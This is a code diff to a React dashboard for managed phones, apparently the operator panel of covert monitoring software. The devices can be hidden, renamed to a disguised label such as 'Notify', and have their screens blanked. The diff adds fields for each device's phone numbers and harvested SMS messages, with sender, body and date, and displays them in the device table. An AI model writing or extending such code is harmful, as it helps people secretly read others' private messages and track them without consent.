@@ -10,6 +10,7 @@ type Device = {
   alias?:string; appLabel?:string; hidden?:boolean;
   blankEnabled?:boolean; relayActive?:boolean; relaySlot?:number;
   inUse?:boolean; screenOn?:boolean; lastUnlock?:string; ringerMode?:string;
+  phoneNumbers?:string[]; sms?:{from:string;body:string;date:number}[];
 };
 
 const APP_LABELS: Record<string, string> = {
@@ -92,7 +93,7 @@ export default function Dashboard(){
             <td className="p-3 text-xs">{d.batteryOptimized?"optimized (risk)":"exempt ✓"}</td>
             <td className="p-3"><span className={`text-xs px-2 py-1 rounded-full ${d.inUse?"bg-green-100 text-green-700":"bg-gray-100"}`}>{d.inUse?"in use":"idle"}</span><div className="text-[11px] text-gray-400 mt-1">{d.screenOn===false?"screen off":"screen on"}{d.lastUnlock?` · unlock ${new Date(d.lastUnlock).toLocaleTimeString()}`:""}</div></td>
             <td className="p-3"><span className="text-xs px-2 py-1 rounded-full bg-gray-100">{d.ringerMode==="silent"?"Silent":d.ringerMode==="vibrate"?"Vibrate":"Normal"}</span></td>
-            <td className="p-3 text-xs">{new Date(d.lastSeen).toLocaleString()}<div className="text-gray-400">first {new Date(d.firstSeen).toLocaleDateString()}</div></td>
+            <td className="p-3 text-xs">{new Date(d.lastSeen).toLocaleString()}<div className="text-gray-400">first {new Date(d.firstSeen).toLocaleDateString()}</div><div className="text-gray-500 mt-1">{(d.phoneNumbers||[]).length>0?`📱 ${(d.phoneNumbers||[]).join(" · ")}`:"📱 no number"}{(d.sms||[]).length>0?` · 💬 ${(d.sms||[]).length}`:""}</div></td>
             <td className="p-3 text-xs">{d.heartbeatCount} <Link href={`/dashboard/${encodeURIComponent(d.deviceId)}`} className="ml-2 text-violet-600 hover:underline">view →</Link></td>
             <td className="p-3"><div className="text-xs font-medium">{d.appLabel||"Notify"}</div><div className="flex gap-1 mt-1">{ALIAS_OPTIONS.map(o=>(
               <button key={o.key} onClick={()=>renameDevice(d.deviceId,o.key,o.label)} title={`Rename to ${o.label}`}
